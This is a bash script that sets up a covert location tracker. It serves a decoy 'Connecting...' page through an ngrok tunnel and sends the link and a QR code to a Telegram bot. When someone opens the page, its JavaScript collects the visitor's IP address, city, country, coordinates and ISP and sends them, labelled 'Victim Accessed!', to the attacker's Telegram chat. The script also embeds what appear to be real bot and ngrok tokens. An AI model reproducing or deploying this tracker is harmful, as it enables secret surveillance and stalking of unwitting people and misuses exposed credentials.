#!/bin/bash

# CONFIG
BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI"
CHAT_ID="5548654620"
PORT=8888

# STEP 1: Setup folder
mkdir -p ~/YASIN-AWARE-TRACKER
cd ~/YASIN-AWARE-TRACKER

# STEP 2: Create index.html
cat > index.html <<EOF
<!DOCTYPE html>
<html>
<head>
  <title>Connecting...</title>
  <script>
    fetch("https://ipinfo.io/json")
      .then(res => res.json())
      .then(data => {
        const info = \`Victim Accessed!\\n\\nIP: \${data.ip}\\nCity: \${data.city}\\nRegion: \${data.region}\\nCountry: \${data.country}\\nLoc: \${data.loc}\\nOrg: \${data.org}\`;
        fetch(\`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=\` + encodeURIComponent(info));
      });
  </script>
</head>
<body>
  <h2>Connecting...</h2>
</body>
</html>
EOF

# STEP 3: Start PHP server
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 3

# STEP 4: Start ngrok
if ! command -v ngrok &> /dev/null; then
  echo "Ngrok not found. Installing..."
  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip
  unzip ngrok-stable-linux-arm.zip
  chmod +x ngrok && mv ngrok $PREFIX/bin/
  rm -rf ngrok-stable-linux-arm.zip
fi

ngrok config add-authtoken 2vXRKQcaXkoE5RHpk4XkAV1aG1w_YTv7irm983WXZKbcH3N2
nohup ngrok http $PORT > /dev/null 2>&1 &
sleep 6

# STEP 5: Get public link
URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')

# STEP 6: Generate QR Code
qrencode -o qr.png "$URL"

# STEP 7: Send to Telegram
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id="$CHAT_ID" -d text="QR Link: $URL"
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" -F chat_id="$CHAT_ID" -F photo="@qr.png"

# DONE
clear
echo "=============================="
echo " YASIN AWARE TRACKER READY "
echo "=============================="
echo "QR + LINK Sent to Telegram"
echo "Link: $URL"
echo "=============================="
